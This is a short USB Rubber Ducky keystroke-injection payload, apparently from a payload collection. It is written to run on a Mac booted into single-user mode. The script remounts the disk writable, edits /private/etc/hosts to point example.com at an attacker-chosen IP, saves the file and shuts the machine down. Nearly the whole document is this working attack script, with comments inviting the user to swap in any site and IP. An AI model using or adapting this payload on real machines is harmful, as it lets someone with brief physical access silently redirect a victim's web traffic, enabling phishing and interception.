* Author - SWISA
* Boot into single user mode and insert ducky. This script will created a dns entry. This payload was encoded with v2.4 on firmware duck_v2.1.hex. Change IP Adress and/or url if you want to 

 REM SWISA
 REM A script to create a dns entry in the host file of a mac
 REM change the example.com to any site you want
 REM change the 127.0.0.1 to any ip you want
 DELAY 1000
 STRING mount -uw /
 ENTER
 DELAY 2000
 ENTER
 STRING nano /private/etc/hosts
 ENTER
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 DOWNARROW
 STRING 127.0.0.1 example.com
 ENTER
 STRING 127.0.0.1 www.example.com
 ENTER
 CTRL O
 ENTER
 CTRL X
 STRING shutdown -h now